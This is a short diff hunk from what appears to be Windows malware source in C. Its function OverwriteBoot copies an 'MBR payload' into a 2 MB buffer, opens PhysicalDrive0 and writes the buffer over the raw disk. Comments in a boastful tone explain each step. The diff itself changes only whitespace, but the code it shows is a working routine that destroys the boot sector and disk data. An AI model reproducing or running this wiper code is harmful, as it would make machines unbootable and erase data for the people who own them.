@@ -22,17 +22,17 @@ int OverwriteBoot() {
 	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 2097152);	// fucking magick. It creates a bigazz 2 mb char array for...
 	int code_count = 0;
 	for (; code_count < code1_len; code_count++)
-		*(bootcode + code_count) = *(code1 + code_count);							// create an MBR payload using that big buffer...
+		*(bootcode + code_count) = *(code1 + code_count);			// create an MBR payload using that big buffer...
 
 	DWORD wrtMBR;
-	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", 								// create a handle to disk and...
+	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", 				// create a handle to disk and...
 		GENERIC_ALL, 
 		FILE_SHARE_READ | FILE_SHARE_WRITE, 
 		0, 
 		OPEN_EXISTING, 
 		0, 0);
 
-	WriteFile(MBR, bootcode, 2097152, &wrtMBR, 0);									// writes the payload. pretty simple, right? 
+	WriteFile(MBR, bootcode, 2097152, &wrtMBR, 0);					// writes the payload. pretty simple, right? 
 	CloseHandle(MBR);
 
 	unsigned char *memoverdisk = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 2097152);
